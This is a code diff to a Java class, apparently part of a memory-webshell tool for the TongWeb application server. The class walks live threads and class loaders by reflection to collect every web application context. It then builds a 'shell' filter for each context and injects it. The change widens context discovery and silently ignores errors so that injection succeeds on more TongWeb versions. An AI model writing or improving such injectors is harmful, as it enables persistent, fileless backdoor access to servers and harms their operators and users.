@@ -34,8 +34,9 @@ public class TongWebFilterInjector {
 
     public TongWebFilterInjector() {
         try {
-            List<Object> contexts = getContext();
+            Set<Object> contexts = getContext();
             for (Object context : contexts) {
+                logger.info(context.getClass().getName());
                 Object filter = getShell(context);
                 inject(context, filter);
             }
@@ -49,20 +50,27 @@ public class TongWebFilterInjector {
      * /opt/tweb6/lib/twnt.jar
      * com.tongweb.catalina.core.ApplicationContext
      * /opt/tweb7/lib/tongweb.jar
-     * com.tongweb.server.core.ApplicationContext
-     * /opt/tweb8/lib/tongweb-web.jar
+     * com.tongweb.server.core.StandardContext
+     * /opt/tweb8/version8.0.6.2/tongweb-web.jar
      */
-    public List<Object> getContext() throws Exception {
-        List<Object> contexts = new ArrayList<Object>();
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
-            if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
-                Collection<?> values = childrenMap.values();
-                for (Object value : values) {
-                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                    contexts.addAll(children.values());
+            try {
+                if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                    Collection<?> values = childrenMap.values();
+                    for (Object value : values) {
+                        Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
+                        contexts.addAll(children.values());
+                    }
+                } else if (thread.getContextClassLoader() != null
+                        && thread.getContextClassLoader().getClass().getSimpleName().equals("TongWebWebappClassLoader")) {
+                    contexts.add(getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context"));
                 }
+            }catch (Exception ignored) {
+
             }
         }
         return contexts;
